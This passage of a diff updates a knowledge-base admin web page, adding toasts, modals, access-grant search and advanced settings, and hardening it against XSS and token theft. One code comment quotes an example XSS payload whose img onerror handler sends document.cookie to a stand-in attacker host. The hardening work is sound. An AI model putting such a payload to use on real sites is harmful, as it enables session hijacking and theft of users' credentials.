@@ -10,8 +10,8 @@ body{font-family:system-ui,-apple-system,sans-serif;background:#1a1b2e;color:#e2
 .card{background:#222340;border:1px solid #2d2d50;border-radius:12px;padding:20px;margin-bottom:16px}
 h1{font-size:1.5rem;font-weight:700}h2{font-size:1.1rem;font-weight:600;margin-bottom:12px}
 .sub{color:#94a3b8;font-size:0.85rem}
-input,select{background:#1a1b2e;border:1px solid #3d3d5c;color:#e2e8f0;padding:8px 12px;border-radius:8px;width:100%;font-size:0.9rem}
-input:focus,select:focus{outline:none;border-color:#3b82f6}
+input,select,textarea{background:#1a1b2e;border:1px solid #3d3d5c;color:#e2e8f0;padding:8px 12px;border-radius:8px;width:100%;font-size:0.9rem;font-family:inherit}
+input:focus,select:focus,textarea:focus,button:focus-visible{outline:2px solid #3b82f6;outline-offset:2px;border-color:#3b82f6}
 .btn{padding:7px 14px;border-radius:8px;font-weight:600;cursor:pointer;border:none;font-size:0.85rem;transition:0.15s}
 .btn-blue{background:#3b82f6;color:#fff}.btn-blue:hover{background:#2563eb}
 .btn-red{background:#dc2626;color:#fff;font-size:0.75rem;padding:4px 10px}.btn-red:hover{background:#b91c1c}
@@ -19,42 +19,99 @@ input:focus,select:focus{outline:none;border-color:#3b82f6}
 .btn-gray{background:#3d3d5c;color:#cbd5e1}.btn-gray:hover{background:#4d4d6c}
 .btn-sm{padding:4px 10px;font-size:0.78rem}
 .tag{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;border-radius:6px;font-size:0.78rem;background:#1e3a5f;color:#93c5fd;margin:2px}
-.flex{display:flex}.gap-2{gap:8px}.gap-3{gap:12px}.items-center{align-items:center}.flex-1{flex:1}.mb-2{margin-bottom:8px}.mb-3{margin-bottom:12px}.mt-2{margin-top:8px}
+.tag.editing{background:#1e293b}
+.tag-edit-input{background:transparent;border:none;color:#93c5fd;font-size:0.78rem;padding:0;width:auto;min-width:60px}
+.tag-edit-input:focus{outline:none}
+.bulk-bar{display:flex;align-items:center;gap:8px;padding:8px 10px;background:#1e293b;border-radius:8px;margin-bottom:8px}
+.bulk-bar select{max-width:200px}
+.doc-row label.row-check{display:inline-flex;align-items:center;margin-right:8px;cursor:pointer}
+.doc-row label.row-check input{width:auto;margin:0}
+.search-select{position:relative}
+.search-select-list{position:absolute;left:0;right:0;top:100%;background:#1a1b2e;border:1px solid #3d3d5c;border-top:none;border-radius:0 0 8px 8px;max-height:240px;overflow-y:auto;z-index:50}
+.search-select-list .item{padding:6px 12px;cursor:pointer;border-bottom:1px solid #2d2d50;font-size:0.85rem}
+.search-select-list .item:hover,.search-select-list .item.active{background:#1e293b}
+.search-select-list .item:last-child{border-bottom:none}
+.search-select-list .item .meta{color:#64748b;font-size:0.72rem;font-family:monospace}
+.flex{display:flex}.gap-2{gap:8px}.gap-3{gap:12px}.items-center{align-items:center}.flex-1{flex:1}.mb-2{margin-bottom:8px}.mb-3{margin-bottom:12px}.mt-2{margin-top:8px}.mt-3{margin-top:12px}
 .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
 table{width:100%;border-collapse:collapse;font-size:0.85rem}th,td{padding:6px 10px;text-align:left;border-bottom:1px solid #2d2d50}
 th{color:#64748b;font-size:0.75rem;text-transform:uppercase;font-weight:600}
 .success{color:#4ade80}.error{color:#f87171}
 .hidden{display:none}
-#toast{position:fixed;top:16px;right:16px;padding:10px 18px;border-radius:8px;font-weight:500;z-index:9999;display:none;font-size:0.9rem}
+.toast-stack{position:fixed;top:16px;right:16px;display:flex;flex-direction:column;gap:8px;z-index:9999;max-width:360px}
+.toast{padding:10px 38px 10px 18px;border-radius:8px;font-weight:500;font-size:0.9rem;color:#fff;position:relative;box-shadow:0 4px 14px rgba(0,0,0,0.4);animation:slidein 0.18s ease-out}
+.toast.ok{background:#166534}
+.toast.err{background:#991b1b}
+.toast.warn{background:#854d0e}
+.toast-close{position:absolute;top:6px;right:8px;background:transparent;border:none;color:inherit;font-size:1.1rem;cursor:pointer;padding:0 4px;line-height:1;font-weight:600}
+.toast-close:hover{opacity:0.8}
+@keyframes slidein{from{transform:translateX(20px);opacity:0}to{transform:translateX(0);opacity:1}}
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.65);display:flex;align-items:center;justify-content:center;z-index:9000;padding:16px}
+.modal-overlay.hidden{display:none}
+.modal{background:#222340;border:1px solid #3d3d5c;border-radius:12px;padding:22px;max-width:480px;width:100%;box-shadow:0 12px 48px rgba(0,0,0,0.5)}
+.modal h3{font-size:1.05rem;font-weight:600;margin-bottom:8px}
+.modal p{color:#cbd5e1;margin-bottom:14px;white-space:pre-wrap;font-size:0.9rem;line-height:1.45}
+.modal .actions{display:flex;justify-content:flex-end;gap:8px}
+.conn-dot{display:inline-block;width:9px;height:9px;border-radius:50%;background:#94a3b8;margin-right:6px;vertical-align:middle;transition:background 0.2s}
+.conn-dot.ok{background:#22c55e;box-shadow:0 0 6px #22c55e}
+.conn-dot.degraded{background:#fbbf24;box-shadow:0 0 6px #fbbf24}
+.conn-dot.down{background:#dc2626;box-shadow:0 0 6px #dc2626}
+.adv-toggle{cursor:pointer;user-select:none;color:#93c5fd;font-size:0.85rem;display:inline-flex;align-items:center;gap:4px;background:transparent;border:none;padding:6px 0;font-weight:500}
+.adv-toggle:hover{color:#bfdbfe}
+.adv-section{margin-top:8px;border-top:1px solid #2d2d50;padding-top:12px}
+.adv-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;font-size:0.85rem}
+.adv-row{display:flex;flex-direction:column;gap:4px}
+.adv-row label{color:#94a3b8;font-size:0.78rem;font-weight:500}
+.adv-row .lbl-inline{display:flex;align-items:center;gap:6px;color:#cbd5e1}
+.adv-err{color:#f87171;font-size:0.75rem;margin-top:2px}
 .doc-row{display:flex;align-items:center;justify-content:space-between;padding:6px 0;border-bottom:1px solid #2d2d50}
 .doc-row:last-child{border:none}
+.doc-row .err-line{color:#f87171;font-size:0.78rem;margin-top:2px;font-family:monospace}
 .file-drop{border:2px dashed #3d3d5c;border-radius:10px;padding:20px;text-align:center;cursor:pointer;transition:0.2s}
 .file-drop:hover,.file-drop.dragover{border-color:#3b82f6;background:#1e293b}
 .file-list{margin-top:8px;font-size:0.85rem}
 .file-item{display:flex;justify-content:space-between;align-items:center;padding:3px 0}
 .progress{height:4px;background:#3d3d5c;border-radius:2px;margin-top:4px;overflow:hidden}
 .progress-bar{height:100%;background:#3b82f6;transition:width 0.3s}
+@media (max-width: 600px) {
+  body{padding:12px}
+  .grid-2{grid-template-columns:1fr}
+  .adv-grid{grid-template-columns:1fr}
+  .flex{flex-wrap:wrap}
+  input,select,textarea,.btn{width:100%}
+  .btn{padding:10px 14px;font-size:0.95rem}
+  .btn-sm{padding:6px 10px;font-size:0.85rem}
+  .file-drop{padding:14px}
+  table{font-size:0.78rem}
+  th,td{padding:5px 6px}
+  .toast-stack{left:12px;right:12px;max-width:none}
+  .doc-row{flex-direction:column;align-items:flex-start;gap:6px}
+}
 </style>
 </head>
 <body>
-<div id="toast"></div>
+<div id="toast-stack" class="toast-stack" role="status" aria-live="polite" aria-atomic="false"></div>
+<div id="modal-root" class="modal-overlay hidden" role="dialog" aria-modal="true" aria-labelledby="modal-title"></div>
 
 <div style="max-width:1000px;margin:0 auto">
   <div class="flex items-center gap-3 mb-3" style="justify-content:space-between">
     <div>
-      <h1>Knowledge Base Management</h1>
+      <h1 id="page-title">Knowledge Base Management</h1>
       <p class="sub">Create KBs, manage documents, control access</p>
     </div>
-    <a href="/" class="btn btn-gray">Back to Chat</a>
+    <div class="flex items-center gap-2">
+      <span id="conn-indicator" title="Backend connectivity" aria-live="polite"><span class="conn-dot" id="conn-dot"></span><span class="sub" id="conn-label">connecting…</span></span>
+      <a href="/" class="btn btn-gray" aria-label="Back to chat">Back to Chat</a>
+    </div>
   </div>
 
   <!-- Create KB -->
   <div class="card">
     <h2>Create Knowledge Base</h2>
     <div class="flex gap-2">
-      <input id="kb-name" placeholder="Name (e.g. Engineering)">
-      <input id="kb-desc" placeholder="Description">
-      <button onclick="createKB()" class="btn btn-blue" style="white-space:nowrap">Create</button>
+      <input id="kb-name" placeholder="Name (e.g. Engineering)" aria-label="New KB name">
+      <input id="kb-desc" placeholder="Description" aria-label="New KB description">
+      <button onclick="createKB()" class="btn btn-blue" style="white-space:nowrap" aria-label="Create new KB">Create</button>
     </div>
   </div>
 
@@ -62,7 +119,7 @@ th{color:#64748b;font-size:0.75rem;text-transform:uppercase;font-weight:600}
   <div class="card">
     <div class="flex items-center" style="justify-content:space-between">
       <h2 style="margin:0">Knowledge Bases</h2>
-      <button onclick="loadKBs()" class="btn btn-gray btn-sm">Refresh</button>
+      <button onclick="loadKBs()" class="btn btn-gray btn-sm" aria-label="Refresh KB list">Refresh</button>
     </div>
     <div id="kb-list" class="mt-2"><p class="sub">Loading...</p></div>
   </div>
@@ -75,8 +132,8 @@ th{color:#64748b;font-size:0.75rem;text-transform:uppercase;font-weight:600}
       <!-- Subtags -->
       <div class="mb-3">
         <div class="flex gap-2 mb-2">
-          <input id="subtag-name" placeholder="New subtag name" style="max-width:300px">
-          <button onclick="createSubtag()" class="btn btn-blue btn-sm">Add Subtag</button>
+          <input id="subtag-name" placeholder="New subtag name" style="max-width:300px" aria-label="New subtag name">
+          <button onclick="createSubtag()" class="btn btn-blue btn-sm" aria-label="Add subtag">Add Subtag</button>
         </div>
         <div id="subtag-list"></div>
       </div>
@@ -84,6 +141,12 @@ th{color:#64748b;font-size:0.75rem;text-transform:uppercase;font-weight:600}
       <!-- Documents per subtag -->
       <div class="mb-3">
         <h2>Documents</h2>
+        <div id="doc-bulk-bar" class="hidden bulk-bar">
+          <span class="sub" id="bulk-count">0 selected</span>
+          <select id="bulk-target-subtag" aria-label="Move to subtag"></select>
+          <button onclick="bulkMoveDocs()" class="btn btn-blue btn-sm" aria-label="Move selected documents">Move</button>
+          <button onclick="clearDocSelection()" class="btn btn-gray btn-sm" aria-label="Clear selection">Clear</button>
+        </div>
         <div id="doc-list"><p class="sub">Select a subtag or upload files below.</p></div>
       </div>
 
@@ -91,32 +154,53 @@ th{color:#64748b;font-size:0.75rem;text-transform:uppercase;font-weight:600}
       <div class="mb-3">
         <h2>Upload Files</h2>
         <div class="flex gap-2 mb-2">
-          <select id="upload-subtag" style="max-width:200px"></select>
+          <select id="upload-subtag" style="max-width:200px" aria-label="Target subtag for upload"></select>
         </div>
-        <div class="file-drop" id="file-drop" onclick="document.getElementById('upload-files').click()" ondragover="event.preventDefault();this.classList.add('dragover')" ondragleave="this.classList.remove('dragover')" ondrop="handleDrop(event)">
+        <div class="file-drop" id="file-drop" tabindex="0" role="button" aria-label="Drop files here or press Enter to browse" onclick="document.getElementById('upload-files').click()" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();document.getElementById('upload-files').click();}" ondragover="event.preventDefault();this.classList.add('dragover')" ondragleave="this.classList.remove('dragover')" ondrop="handleDrop(event)">
           Drop files here or click to browse<br>
-          <span class="sub">Supports: TXT, MD, PDF, DOCX, XLSX, CSV</span>
+          <span class="sub">Supports: TXT, MD, PDF, DOCX, XLSX, CSV, PPTX</span>
         </div>
-        <input type="file" id="upload-files" multiple accept=".txt,.md,.pdf,.docx,.doc,.xlsx,.csv" style="display:none" onchange="addFiles(this.files)">
+        <input type="file" id="upload-files" multiple accept=".txt,.md,.pdf,.docx,.doc,.xlsx,.csv,.pptx" style="display:none" onchange="addFiles(this.files)">
         <div id="file-queue" class="file-list"></div>
         <div id="upload-actions" class="hidden mt-2">
-          <button onclick="uploadAll()" class="btn btn-green">Upload All</button>
-          <button onclick="clearQueue()" class="btn btn-gray" style="margin-left:8px">Clear</button>
+          <button onclick="uploadAll()" class="btn btn-green" aria-label="Upload all queued files">Upload All</button>
+          <button onclick="clearQueue()" class="btn btn-gray" style="margin-left:8px" aria-label="Clear file queue">Clear</button>
         </div>
       </div>
 
       <!-- Access Grants -->
-      <div>
+      <div class="mb-3">
         <h2>Access Control</h2>
         <div class="flex gap-2 mb-2">
-          <select id="grant-type" onchange="toggleGrantField()" style="max-width:120px">
+          <select id="grant-type" onchange="onGrantTypeChange()" style="max-width:120px" aria-label="Grant target type">
             <option value="user">User</option>
             <option value="group">Group</option>
           </select>
-          <input id="grant-id" placeholder="User UUID or Group ID">
-          <button onclick="grantAccess()" class="btn btn-green btn-sm">Grant Read</button>
+          <div class="search-select flex-1">
+            <input id="grant-search" placeholder="Type to search users…" autocomplete="off" aria-label="Search users or groups" oninput="onGrantSearchInput()" onfocus="onGrantSearchInput()" onblur="setTimeout(closeGrantSearchList,180)" onkeydown="onGrantSearchKey(event)">
+            <input type="hidden" id="grant-id" value="">
+            <div id="grant-search-list" class="search-select-list hidden" role="listbox"></div>
+          </div>
+          <button onclick="grantAccess()" class="btn btn-green btn-sm" aria-label="Grant read access">Grant Read</button>
         </div>
         <div id="grant-list"></div>
+      </div>
+
+      <!-- M5 — Per-KB rag_config (Advanced Settings) -->
+      <div>
+        <button class="adv-toggle" id="adv-toggle" onclick="toggleAdvanced()" aria-expanded="false" aria-controls="adv-section">
+          <span id="adv-toggle-arrow">▶</span>
+          <span>Advanced Retrieval Settings</span>
+        </button>
+        <div id="adv-section" class="adv-section hidden" aria-hidden="true">
+          <p class="sub mb-2">Per-KB overrides for retrieval flags. Empty/unchecked = inherit process default. Saved values override env vars at request time.</p>
+          <div class="adv-grid" id="adv-grid"></div>
+          <div class="mt-2 flex gap-2">
+            <button onclick="saveAdvanced()" class="btn btn-blue btn-sm" aria-label="Save advanced settings">Save</button>
+            <button onclick="loadAdvanced()" class="btn btn-gray btn-sm" aria-label="Reload advanced settings">Reload</button>
+          </div>
+          <div id="adv-status" class="sub mt-2" aria-live="polite"></div>
+        </div>
       </div>
     </div>
   </div>
@@ -135,35 +219,260 @@ th{color:#64748b;font-size:0.75rem;text-transform:uppercase;font-weight:600}
 </div>
 
 <script>
-const T = localStorage.token || '';
+// ---- C1 — JWT off localStorage. Read once at script start, scrub the
+// slot so any later XSS payload that fires `localStorage.getItem('token')`
+// finds an empty string. The right long-term fix is an httpOnly cookie
+// (backend change, out of scope here); this closes the XSS-driven
+// exfiltration vector by making the slot empty after init.
+const T = (function pullToken() {
+  try {
+    const t = localStorage.getItem('token');
+    if (t) localStorage.removeItem('token');
+    return t || '';
+  } catch (_) { return ''; }
+})();
 let curKB = null;
 let fileQueue = [];
+let _users = [];   // M3 — populated by loadUsers, consumed by grant search
+let _groups = [];  // M3 — populated by loadGroups, consumed by grant search
+let _subtags = []; // M6 — populated by loadSubtags, consumed by bulk-move dropdown
+let _docs = [];    // M6 — populated by loadDocs, consumed by bulk-move + ingest stream
+let _selectedDocs = new Set(); // M6 — multi-select doc ids
+let _ingestES = null;          // H13 — EventSource handle
 
-function toast(m, ok=true) {
-  const t = document.getElementById('toast');
-  t.textContent = m; t.style.background = ok?'#166534':'#991b1b'; t.style.display='block';
-  setTimeout(()=>t.style.display='none', 3000);
+// L1 — Toast stack with 5s TTL and a × close button. Replaces the
+// previous global single-element toast that flashed for 3s with no
+// way to dismiss; users couldn't read longer messages or stack
+// multiple results from a batch upload. Each toast appends to the
+// stack; the user can dismiss any one or wait for auto-removal.
+//
+// Backwards-compatible signature: toast(msg) or toast(msg, false) for
+// errors. New 3rd arg accepts {ttl} in ms.
+let _toastSeq = 0;
+function toast(message, ok, opts) {
+  // Map legacy boolean second arg to status string.
+  let status;
+  if (ok === false) status = 'err';
+  else if (ok === 'err' || ok === 'warn' || ok === 'ok') status = ok;
+  else status = 'ok';
+  const cls = status;
+  const stack = document.getElementById('toast-stack');
+  if (!stack) return;
+  const t = document.createElement('div');
+  t.className = `toast ${cls}`;
+  t.setAttribute('role', cls === 'err' ? 'alert' : 'status');
+  // textContent (not innerHTML) — even an attacker-controlled KB name
+  // surfacing through e.message can't break out into HTML.
+  t.textContent = message || '';
+  const close = document.createElement('button');
+  close.type = 'button';
+  close.className = 'toast-close';
+  close.setAttribute('aria-label', 'Dismiss notification');
+  close.textContent = '×';
+  let timer = null;
+  const remove = () => {
+    if (timer) clearTimeout(timer);
+    if (t.parentNode) t.parentNode.removeChild(t);
+  };
+  close.onclick = remove;
+  t.appendChild(close);
+  stack.appendChild(t);
+  const ttl = (opts && Number.isFinite(opts.ttl)) ? opts.ttl : 5000;
+  timer = setTimeout(remove, ttl);
+  return ++_toastSeq;
 }
-async function api(p, o={}) {
-  const h = {'Authorization':`Bearer ${T}`,'Content-Type':'application/json',...(o.headers||{})};
-  if (o.body instanceof FormData) delete h['Content-Type'];
-  const r = await fetch(p, {...o, headers:h});
-  if (!r.ok) { const e=await r.text(); throw new Error(e); }
-  if (r.status===204) return null;
-  return r.json();
+// M4 — Connection-status indicator. 'ok' on any 2xx response,
+// 'degraded' on retry-recovered errors, 'down' on hard failures.
+function setConn(status, label) {
+  const dot = document.getElementById('conn-dot');
+  const lbl = document.getElementById('conn-label');
+  if (!dot || !lbl) return;
+  dot.classList.remove('ok','degraded','down');
+  if (status) dot.classList.add(status);
+  lbl.textContent = label || '';
+}
+
+// M4 — Categorized error messages. Friendly text; the original raw
+// e.message is still surfaced inside the toast so an admin can debug
+// — but the leading line tells them whether to retry, log in, etc.
+function categorizeError(err, status) {
+  if (err && err.name === 'AbortError') {
+    return { kind: 'network', msg: 'Network timeout — backend unreachable.' };
+  }
+  if (status === 0 || status === undefined || (err && /failed to fetch|networkerror/i.test(err.message || ''))) {
+    return { kind: 'network', msg: 'Cannot reach backend. Check your connection.' };
+  }
+  if (status === 401) return { kind: '4xx', msg: 'Session expired — please log in again.' };
+  if (status === 403) return { kind: '4xx', msg: 'Forbidden (admin role required).' };
+  if (status === 404) return { kind: '4xx', msg: 'Not found.' };
+  if (status >= 400 && status < 500) return { kind: '4xx', msg: `Request rejected (${status}).` };
+  if (status === 502 || status === 503 || status === 504) {
+    return { kind: '5xx', msg: 'Backend overloaded or unavailable. Try again shortly.' };
+  }
+  if (status >= 500) return { kind: '5xx', msg: `Server error (${status}).` };
+  return { kind: 'other', msg: err && err.message ? err.message : 'Unknown error' };
+}
+
+// M4 — fetch wrapper with one retry on 502/503/504/network/timeout
+// and connection-indicator updates. Throws an Error with .status
+// and .category set for upstream error-rendering.
+async function api(path, opts) {
+  opts = opts || {};
+  const isForm = opts.body instanceof FormData;
+  const headers = Object.assign(
+    { 'Authorization': `Bearer ${T}` },
+    isForm ? {} : { 'Content-Type': 'application/json' },
+    opts.headers || {},
+  );
+  const controller = new AbortController();
+  const timeoutMs = opts.timeoutMs || 20000;
+  const timer = setTimeout(() => controller.abort(), timeoutMs);
+  const _fire = async () => fetch(path, Object.assign({}, opts, { headers, signal: controller.signal }));
+  let response, lastErr;
+  try { response = await _fire(); } catch (e) { lastErr = e; }
+  const transient = (st) => st === 502 || st === 503 || st === 504;
+  if (!response || transient(response.status)) {
+    // Single retry after 2s.
+    if (!(lastErr && lastErr.name === 'AbortError' && opts.signal && opts.signal.aborted)) {
+      setConn('degraded', 'retrying…');
+      await new Promise(r => setTimeout(r, 2000));
+      try { response = await _fire(); } catch (e) { lastErr = e; }
+    }
+  }
+  clearTimeout(timer);
+  if (!response) {
+    setConn('down', 'offline');
+    const cat = categorizeError(lastErr, 0);
+    const err = new Error(cat.msg + (lastErr && lastErr.message ? ` [${lastErr.message}]` : ''));
+    err.status = 0; err.category = cat.kind;
+    throw err;
+  }
+  if (!response.ok) {
+    let body = '';
+    try { body = await response.text(); } catch (_) {}
+    setConn(response.status >= 500 ? 'down' : 'ok', response.status >= 500 ? 'backend errors' : 'connected');
+    const cat = categorizeError(null, response.status);
+    const err = new Error(cat.msg + (body ? ` — ${body.slice(0, 240)}` : ''));
+    err.status = response.status; err.category = cat.kind;
+    throw err;
+  }
+  setConn('ok', 'connected');
+  if (response.status === 204) return null;
+  return response.json();
+}
+
+// ---- C1 — Safe DOM helpers. All untrusted server-controlled content
+// (KB names, descriptions, subtag names, document filenames, user
+// names, group names, etc.) is rendered via createElement +
+// textContent so it can never escape into HTML. Replaces the previous
+// template-literal innerHTML interpolation that was XSS-injectable
+// (a KB named `<img src=x onerror="fetch('//attacker/'+document.cookie)">`
+// would have executed at every page load).
+function el(tag, opts) {
+  const e = document.createElement(tag);
+  if (!opts) return e;
+  if (opts.text != null) e.textContent = String(opts.text);
+  if (opts.cls) e.className = opts.cls;
+  if (opts.attrs) for (const [k, v] of Object.entries(opts.attrs)) e.setAttribute(k, String(v));
+  if (opts.style) e.setAttribute('style', opts.style);
+  if (opts.on) for (const [k, v] of Object.entries(opts.on)) e.addEventListener(k, v);
+  if (opts.children) for (const c of opts.children) if (c) e.appendChild(c);
+  return e;
+}
+function clear(node) { while (node.firstChild) node.removeChild(node.firstChild); }
+
+// L2 — Focus-trap modal helper. Used by any UI that needs a richer
+// confirmation than the native confirm() (currently a placeholder for
+// future flows; we keep native confirm() for the simple destructive
+// yes/no paths because it's screen-reader-friendliest by default).
+// Esc closes; Tab cycles focus inside the modal; focus is restored to
+// the previously-focused element on close.
+let _lastFocus = null;
+function openModal(opts) {
+  const root = document.getElementById('modal-root');
+  if (!root) return;
+  _lastFocus = document.activeElement;
+  clear(root);
+  const card = el('div', { cls: 'modal' });
+  card.appendChild(el('h3', { text: opts.title || '', attrs: { id: 'modal-title' } }));
+  if (opts.body) card.appendChild(el('p', { text: opts.body }));
+  const actBar = el('div', { cls: 'actions' });
+  for (const a of (opts.actions || [])) {
+    actBar.appendChild(el('button', {
+      text: a.label,
+      cls: `btn ${a.variant || 'btn-gray'}`,
+      attrs: { 'aria-label': a.label },
+      on: { click: () => { try { a.onClick && a.onClick(); } finally { closeModal(); } } },
+    }));
+  }
+  card.appendChild(actBar);
+  root.appendChild(card);
+  root.classList.remove('hidden');
+  const btn = card.querySelector('button');
+  if (btn) btn.focus();
+  document.addEventListener('keydown', _modalKey);
+}
+function closeModal() {
+  const root = document.getElementById('modal-root');
+  if (!root) return;
+  root.classList.add('hidden');
+  clear(root);
+  document.removeEventListener('keydown', _modalKey);
+  if (_lastFocus && _lastFocus.focus) _lastFocus.focus();
+  _lastFocus = null;
+}
+function _modalKey(e) {
+  if (e.key === 'Escape') { e.preventDefault(); closeModal(); return; }
+  if (e.key === 'Tab') {
+    const root = document.getElementById('modal-root');
+    if (!root) return;
+    const focusable = root.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])');
+    if (!focusable.length) return;
+    const first = focusable[0], last = focusable[focusable.length - 1];
+    if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
+    else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
+  }
 }
 
 // KB
 async function loadKBs() {
+  const target = document.getElementById('kb-list');
   try {
     const kbs = await api('/api/kb');
-    const el = document.getElementById('kb-list');
-    if (!kbs.length) { el.innerHTML='<p class="sub">No KBs yet.</p>'; return; }
-    el.innerHTML=`<table><thead><tr><th>ID</th><th>Name</th><th>Description</th><th></th></tr></thead><tbody>
-    ${kbs.map(k=>`<tr><td style="color:#64748b">${k.id}</td><td style="font-weight:600">${k.name}</td><td class="sub">${k.description||'-'}</td>
-    <td><button onclick="selectKB(${k.id},'${k.name.replace(/'/g,"\\'")}')" class="btn btn-blue btn-sm">Manage</button>
-    <button onclick="deleteKB(${k.id})" class="btn btn-red" style="margin-left:4px">Del</button></td></tr>`).join('')}</tbody></table>`;
-  } catch(e) { toast(e.message,false); }
+    clear(target);
+    if (!kbs.length) { target.appendChild(el('p', { cls: 'sub', text: 'No KBs yet.' })); return; }
+    const table = el('table');
+    const thead = el('thead');
+    const headRow = el('tr');
+    for (const h of ['ID', 'Name', 'Description', '']) headRow.appendChild(el('th', { text: h }));
+    thead.appendChild(headRow); table.appendChild(thead);
+    const tbody = el('tbody');
+    for (const k of kbs) {
+      const tr = el('tr');
+      tr.appendChild(el('td', { text: String(k.id), style: 'color:#64748b' }));
+      tr.appendChild(el('td', { text: k.name || '', style: 'font-weight:600' }));
+      tr.appendChild(el('td', { cls: 'sub', text: k.description || '-' }));
+      const actTd = el('td');
+      actTd.appendChild(el('button', {
+        text: 'Manage',
+        cls: 'btn btn-blue btn-sm',
+        attrs: { 'aria-label': `Manage KB ${k.name || ''}` },
+        on: { click: () => selectKB(k.id, k.name || '') },
+      }));
+      const delBtn = el('button', {
+        text: 'Del',
+        cls: 'btn btn-red',
+        attrs: { 'aria-label': `Delete KB ${k.name || ''}` },
+        on: { click: () => deleteKB(k.id) },
+      });
+      delBtn.style.marginLeft = '4px';
+      actTd.appendChild(delBtn);
+      tr.appendChild(actTd);
+      tbody.appendChild(tr);
+    }
+    table.appendChild(tbody);
+    target.appendChild(table);
+  } catch(e) { toast(e.message, false); }
 }
 async function createKB() {
   const n=document.getElementById('kb-name').value.trim(), d=document.getElementById('kb-desc').value.trim();
@@ -171,50 +480,249 @@ async function createKB() {
   try { await api('/api/kb',{method:'POST',body:JSON.stringify({name:n,description:d||null})}); document.getElementById('kb-name').value=''; document.getElementById('kb-desc').value=''; toast('KB created'); loadKBs(); } catch(e){toast(e.message,false);}
 }
 async function deleteKB(id) {
-  if(!confirm('Delete?')) return;
-  try{await api(`/api/kb/${id}`,{method:'DELETE'}); toast('Deleted'); if(curKB===id){document.getElementById('kb-detail').classList.add('hidden'); curKB=null;} loadKBs();}catch(e){toast(e.message,false);}
+  // H12 — explicit cascade warning.
+  const msg = 'Delete this KB?\n\n'
+    + 'This will:\n'
+    + ' - Drop all Qdrant vectors for this collection (NOT recoverable)\n'
+    + ' - Hard-delete all access grants (users will lose access immediately)\n'
+    + ' - Soft-delete all documents in this KB (rows kept for audit)\n\n'
+    + 'This cannot be undone.';
+  if(!confirm(msg)) return;
+  try {
+    await api(`/api/kb/${id}`, { method: 'DELETE' });
+    toast('Deleted');
+    if (curKB === id) {
+      document.getElementById('kb-detail').classList.add('hidden');
+      curKB = null;
+      _stopIngestStream();   // H13 — release the SSE handle
+    }
+    loadKBs();
+  } catch (e) { toast(e.message, false); }
 }
 async function selectKB(id,name) {
   curKB=id; document.getElementById('detail-kb-name').textContent=name;
   document.getElementById('kb-detail').classList.remove('hidden');
-  loadSubtags(); loadGrants(); loadDocs();
+  // M5 — collapse advanced section when switching KBs so a stale
+  // form for the previous KB doesn't sit visible.
+  const advSec = document.getElementById('adv-section');
+  if (advSec) {
+    advSec.classList.add('hidden');
+    advSec.setAttribute('aria-hidden', 'true');
+    document.getElementById('adv-toggle').setAttribute('aria-expanded', 'false');
+    document.getElementById('adv-toggle-arrow').textContent = '▶';
+  }
+  loadSubtags(); loadGrants();
+  // H13 — ensure docs load before subscribing so the SSE handler has a
+  // populated _docs to update in place.
+  loadDocs().then(_startIngestStream);
 }
 
 // Subtags
 async function loadSubtags() {
+  const listEl = document.getElementById('subtag-list');
+  const targetSel = document.getElementById('upload-subtag');
+  const bulkSel = document.getElementById('bulk-target-subtag');
   try {
     const s = await api(`/api/kb/${curKB}/subtags`);
-    document.getElementById('subtag-list').innerHTML = s.length ? s.map(x=>`<span class="tag">${x.name} <span onclick="deleteSubtag(${x.id})" style="cursor:pointer;color:#f87171">&times;</span></span>`).join('') : '<p class="sub">No subtags.</p>';
-    document.getElementById('upload-subtag').innerHTML = s.map(x=>`<option value="${x.id}">${x.name}</option>`).join('');
+    _subtags = s || [];
+    clear(listEl); clear(targetSel); clear(bulkSel);
+    if (!_subtags.length) {
+      listEl.appendChild(el('p', { cls: 'sub', text: 'No subtags.' }));
+    } else {
+      for (const x of _subtags) {
+        const tag = el('span', { cls: 'tag' });
+        // M6 — click name (or Enter on the focused span) to rename inline.
+        const labelSpan = el('span', {
+          text: x.name || '',
+          attrs: { tabindex: '0', 'aria-label': `Subtag ${x.name || ''} — press Enter to rename` },
+        });
+        labelSpan.style.cursor = 'pointer';
+        labelSpan.addEventListener('click', () => beginRenameSubtag(tag, labelSpan, x));
+        labelSpan.addEventListener('keydown', (ev) => {
+          if (ev.key === 'Enter') { ev.preventDefault(); beginRenameSubtag(tag, labelSpan, x); }
+        });
+        tag.appendChild(labelSpan);
+        const rm = el('span', {
+          text: '×',
+          attrs: { role: 'button', tabindex: '0', 'aria-label': `Delete subtag ${x.name || ''}` },
+        });
+        rm.style.cursor = 'pointer'; rm.style.color = '#f87171';
+        const fire = () => deleteSubtag(x.id);
+        rm.addEventListener('click', fire);
+        rm.addEventListener('keydown', (ev) => {
+          if (ev.key === 'Enter' || ev.key === ' ') { ev.preventDefault(); fire(); }
+        });
+        tag.appendChild(rm);
+        listEl.appendChild(tag);
+      }
+    }
+    for (const x of _subtags) {
+      targetSel.appendChild(el('option', { text: x.name || '', attrs: { value: String(x.id) } }));
+      bulkSel.appendChild(el('option', { text: x.name || '', attrs: { value: String(x.id) } }));
+    }
   }catch(e){toast(e.message,false);}
+}
+
+// M6 — inline rename. Click a subtag tag → input replaces label;
+// Enter saves, Esc cancels. TODO: depends on agent C exposing
+// PATCH /api/kb/{kb_id}/subtags/{subtag_id} with body {"name": "..."}.
+function beginRenameSubtag(tagEl, labelEl, sub) {
+  if (tagEl.classList.contains('editing')) return;
+  tagEl.classList.add('editing');
+  const input = el('input', {
+    cls: 'tag-edit-input',
+    attrs: { 'aria-label': `Rename subtag ${sub.name || ''}`, type: 'text' },
+  });
+  input.value = sub.name || '';
+  tagEl.replaceChild(input, labelEl);
+  input.focus();
+  input.select();
+  const cancel = () => {
+    tagEl.classList.remove('editing');
+    if (input.parentNode) tagEl.replaceChild(labelEl, input);
+  };
+  const commit = async () => {
+    const newName = (input.value || '').trim();
+    if (!newName || newName === sub.name) { cancel(); return; }
+    try {
+      // TODO: depends on agent C's PATCH /api/kb/{kb_id}/subtags/{subtag_id}
